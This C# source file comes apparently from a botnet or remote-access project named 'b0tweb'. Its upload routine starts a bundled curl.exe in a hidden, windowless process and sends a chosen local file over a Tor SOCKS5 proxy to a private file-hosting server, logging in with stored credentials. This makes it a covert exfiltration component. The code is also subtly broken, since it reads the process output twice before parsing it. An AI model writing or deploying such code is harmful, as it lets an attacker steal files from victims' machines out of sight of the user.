using System;
using System.IO;
using Newtonsoft.Json;
using System.Diagnostics;

namespace b0tweb
{
    /// <summary>
    /// Upload a file to a private Pomf Clone.
    /// </summary>
    class HTTPUpload
    {
        /// <summary>
        /// Upload a file to the hosted pomf clone on Tor.
        /// </summary>
        /// <param name="filePath">Path to the file to upload.</param>
        /// <returns>Empty string if something went wrong, else an URL pointing to a file.</returns>
        public static string Upload(string filePath)
        {
            string basePath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            string argument = String.Format(
                 "--socks5-hostname {0}:{1}  -F \"files[]=@{2}\" {3}  --user {4}:{5}",
                TorProxy.Host,
                TorProxy.Port,
                filePath,
                Configuration.HTTPServer,
                Configuration.HTTPUsername,
                Configuration.HTTPPassword
            );

            ProcessStartInfo info = new ProcessStartInfo(basePath + @"\Curl\curl.exe", argument)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            Process process = new Process()
            {
                StartInfo = info
            };

            process.Start();

            try
            {
                Console.WriteLine(process.StandardOutput.ReadToEnd());
                dynamic json = JsonConvert.DeserializeObject(process.StandardOutput.ReadToEnd());

                if (json.success == true)
                {
                    return json.files[0].url;
                }

                // Will be set if not successful
                return json.description;
            }
            catch (Exception e)
            {
                return e.Message;
            }
        }
    }
}
